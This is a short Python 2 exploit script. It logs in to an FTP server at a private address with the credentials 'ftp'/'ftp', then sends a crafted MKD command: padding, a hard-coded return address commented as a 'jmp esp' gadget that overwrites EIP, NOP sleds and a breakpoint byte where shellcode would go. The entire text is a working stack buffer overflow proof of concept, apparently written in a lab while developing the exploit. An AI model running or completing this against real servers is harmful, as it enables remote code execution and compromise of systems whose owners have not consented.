#!/usr/bin/python
from socket import *
import time
import sys

# Vars
host = "192.168.178.24"
port = 21
user = "ftp"
password = "ftp"
multiplier = 667
# jmp esp = "76 26 11 B3" , little endian = "B3 11 26 76"
EIP = "\xB3\x11\x26\x76"

# Socket 
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

# Login
s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

print "[*] sending %s bytes of data" % multiplier
content = "MKD "
content += "\n" * 667
content += "A" * 27
content += EIP
content += "\x90" * 31
content += "\x90" * 20
content += "\xcc"
content += "\x90" * 107 
content += "\r\n"
s.send(content)
s.recv(1024)
